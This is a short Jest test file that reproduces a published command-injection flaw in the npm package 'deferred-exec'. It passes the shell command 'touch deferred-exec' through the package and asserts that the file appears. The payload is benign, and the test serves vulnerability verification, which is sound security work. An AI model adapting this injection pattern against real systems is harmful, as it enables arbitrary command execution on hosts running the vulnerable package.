//https://snyk.io/vuln/SNYK-JS-DEFERREDEXEC-1050433
test("Command Injection in deferred-exec", () => {
  const a = require("deferred-exec");
  const fs = require("fs");
  const path = "./deferred-exec";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(" touch deferred-exec ", {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
